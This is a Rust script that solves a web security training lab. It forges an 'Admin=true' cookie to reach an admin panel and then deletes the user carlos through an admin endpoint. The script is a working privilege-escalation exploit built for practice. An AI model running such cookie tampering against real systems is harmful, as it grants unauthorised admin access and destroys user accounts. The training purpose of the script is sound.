/*****************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 4/9/2023
*
* Lab: User role controlled by request parameter
*
* Steps: 1. Change the cookie 'Admin' to 'true'
*        2. Fetch the admin panel
*        3. Delete carlos
*
******************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0ae00053042f954681fadea1004700ef.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "1. Changing the cookie 'Admin' to 'true'..".white(),
        "OK".green()
    );
    print!("{} ", "2. Fetching the admin panel..".white());
    io::stdout().flush();

    // fetch the admin panel
    // this step in not necessary in the script, you can do step 2 directly
    // it's only a must when solving the lab using the browser
    let admin_panel = client
        .get(format!("{url}/admin"))
        .header("Cookie", format!("Admin=True"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));

    println!("{}", "OK".green());
    print!("{} ", "3. Deleting carlos..".white());
    io::stdout().flush();

    // delete carlos
    client
        .get(format!("{url}/admin/delete?username=carlos"))
        .header("Cookie", format!("Admin=true"))
        .send()
        .expect(&format!("{}", "[!] Failed to delete carlos".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 The lab should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
